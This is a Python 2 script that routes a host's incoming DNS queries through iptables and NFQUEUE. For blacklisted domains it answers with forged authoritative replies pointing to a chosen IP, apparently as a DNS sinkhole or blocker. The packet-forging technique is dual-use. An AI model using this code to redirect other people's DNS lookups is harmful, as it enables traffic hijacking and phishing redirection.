#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Created: 2017-02-22
# Author: Johnathan
#
# Distributed under terms of the MIT license.
# Requires python-nfqueue 0.4-3

import time
import argparse
import nfqueue
import os
import subprocess as sp
from socket import getfqdn

try:
    from scapy.all import *
except ImportError:
    from scapy import *
try:
    from subprocess import DEVNULL
except ImportError:
    DEVNULL = open(os.devnull, 'wb')

parser = argparse.ArgumentParser()
parser.add_argument('--domains', dest='domains', action='store', nargs='+', default=None, required=True, type=str,
                    help='List of domains to block. Use \'*\' to select all hosts.')
parser.add_argument('--hosts', dest='hosts', action='store', nargs='+', default=None, required=True, type=str,
                    help='List of the IP addresses from hosts to be blacklisted. Use \'*\' to select all hosts.')
parser.add_argument('--spoof', dest='redirect_ip', action='store', default='192.168.2.98', required=False,
                    type=str, help='The response IP address of the spoofed packets.')
parser.add_argument('--whitelist', dest='whitelist', action='store', nargs='+', default=[], required=False, type=str,
                    help='Domains to be excluded when the wildcard is applied to the --domain arg.')
args = parser.parse_args()

iptables_table = 'dns_reject'
iptables_bin = '/sbin/iptables'


def clean_iptables(table_name):
    try:
        sp.check_call([iptables_bin, '-L', table_name], stdout=DEVNULL, stderr=DEVNULL)
        sp.Popen([iptables_bin, '-D', 'INPUT', '-j', table_name], stdout=DEVNULL, stderr=DEVNULL)
        sp.Popen([iptables_bin, '-F', table_name], stdout=DEVNULL, stderr=DEVNULL)
        sp.Popen([iptables_bin, '-X', table_name], stdout=DEVNULL, stderr=DEVNULL)
    except sp.CalledProcessError as err:
        pass


def create_iptables(table_name, ips):
    sp.Popen([iptables_bin, '-N', table_name], stdout=DEVNULL, stderr=DEVNULL)
    sp.Popen([iptables_bin, '-A', 'INPUT', '-j', table_name], stdout=DEVNULL, stderr=DEVNULL)
    if args.hosts == ['*']:
        sp.Popen([iptables_bin, '-A', table_name, '-p', 'udp', '--dport', '53', '-j', 'NFQUEUE'],
                 stdout=DEVNULL, stderr=DEVNULL)
    else:
        sp.Popen([iptables_bin, '-A', table_name, '-s', ','.join(ips), '-p', 'udp', '--dport', '53', '-j', 'NFQUEUE'],
                stdout=DEVNULL, stderr=DEVNULL)

def search_whitelist(domain):
    for d in args.whitelist:
        if d in domain:
            return True
    return False

def search_blacklist(domain):
    for d in args.domains:
        if d in domain:
            return True
    return False

def callback(payload):
    data = payload.get_data()
    pkt = IP(data)
    print "{} {:<40} -> {}".format(time.strftime("%Y-%m-%d %H:%M"), pkt[DNS].qd.qname[:38], getfqdn(pkt[IP].src))
    if not pkt.haslayer(DNSQR):
        payload.set_verdict(nfqueue.NF_ACCEPT)
    else:
        if search_blacklist(pkt[DNS].qd.qname) or (args.domains == ['*'] and not search_whitelist(pkt[DNS].qd.qname)):
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=args.redirect_ip))
            payload.set_verdict(nfqueue.NF_DROP)
            send(spoofed_pkt, verbose=0)
            print "{} *SPOOFED* {:<30} -> {}".format(time.strftime("%Y-%m-%d %H:%M"), pkt[DNS].qd.qname[:28],
                                                     getfqdn(pkt[IP].src))
            return
        print "{} {:<40} -> {}".format(time.strftime("%Y-%m-%d %H:%M"), pkt[DNS].qd.qname[:38], getfqdn(pkt[IP].src))


def main():
    if os.getgid():
        print("NFQUEUE requires root permissions.")
        sys.exit(1)
    if args.whitelist and args.domains != ['*']:
        print('USAGE: --domains \'*\' --whitelist domain1')
        sys.exit(1)
    clean_iptables(iptables_table)
    create_iptables(iptables_table, args.hosts)
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(0)
    try:
        q.try_run()  # Main loop
    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        clean_iptables(iptables_table)
        sys.exit('Closing...')


if __name__ == '__main__':
    main()
